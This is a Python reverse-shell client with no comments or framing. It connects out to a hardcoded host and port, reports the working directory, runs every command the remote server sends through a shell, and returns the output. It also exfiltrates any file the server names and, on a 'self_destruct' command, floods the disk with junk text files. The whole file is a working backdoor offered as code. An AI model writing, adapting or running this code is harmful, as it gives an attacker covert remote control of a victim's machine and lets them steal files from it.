import socket
import os
import string
import random
import subprocess


host = "127.0.0.1"
port = 1337

s = socket.socket()
s.connect((host, port))

s.send(str.encode(os.getcwd()))

def recv_execute():
    while True:
        data = s.recv(1000000).decode()
        try:
            blacklisted_words = ["<NULL>", "download", "download_request:", "!fuck"]

            
            if (data.startswith("<NULL>") or data.startswith("download") or data.startswith("download_request:") or data.startswith("!fuck")) == False:
                x = subprocess.check_output(data, shell=True)
                s.send(x)

        except Exception as e:
            s.send(str.encode(str(e)))

        if data.startswith("cd"):
            try:
                directory = data.removeprefix("cd ")
                os.chdir(directory)
            except Exception as e:
                print(e)

        if data.startswith("download_request:"):
            requested_file = data.removeprefix("download_request:")
            f=open(requested_file, "rb")
            s.send(str.encode(f"::DOWNLOADING_FILE:FILE_NAME:{requested_file}:\n{f.read()}"))

        if data == "::self_destruct_request::":
            for i in range(10):
                filename = ''.join(random.choice(string.digits + string.ascii_letters)for _ in range(16))
                os.system(f'echo SELF DESTRUCT MESSAGE LOL INFLATION: {filename * 256} > {filename}.txt')
            
        
recv_execute()



